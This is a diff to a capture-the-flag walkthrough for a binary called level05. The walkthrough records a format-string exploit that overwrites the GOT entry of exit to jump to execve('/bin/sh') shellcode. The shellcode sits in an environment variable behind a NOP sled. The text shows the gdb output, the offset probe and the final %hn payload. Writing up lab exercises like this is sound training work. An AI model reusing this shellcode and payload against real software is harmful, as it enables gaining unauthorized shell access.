@@ -7,6 +7,10 @@
 scp -P 4242 level05@192.168.56.109:level05 binary/
 ```
 
+## printf exploit
+
+**objective** : overwrite `exit` return address to execute a shellcode
+
 ```
 (gdb) disas exit
 Dump of assembler code for function exit@plt:
@@ -16,7 +20,7 @@ Dump of assembler code for function exit@plt:
 End of assembler dump.
 ```
 
-return exit() : 0x080497e0
+`exit` return address : 0x080497e0
 
 shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
 ```
@@ -42,14 +46,21 @@ $ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x
 ---Type <return> to continue, or q <return> to quit---
 ```
 
-env SHELLCODE address : 0xffffd8ac
+- env SHELLCODE address : 0xffffd8ac
+   - ffff = 65535
+   - d8ac = 55468
 
-- ffff = 65535
-- d8ac = 55468
 55468 - 8 = 55460\
 65535 - 55468 = 10067
 
 return exit() + 2 : 0x080497e2
+
+- find offset :
+```
+python -c 'print "\xe0\x97\x04\x08" + "%p " * 15' | ./level05 
+�0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x80497e0 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+```
+offet : 10
 
 ```
 $ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55460u" + "%10$hn" + "%10067u" + "%11$hn %10$p"' > /tmp/level05
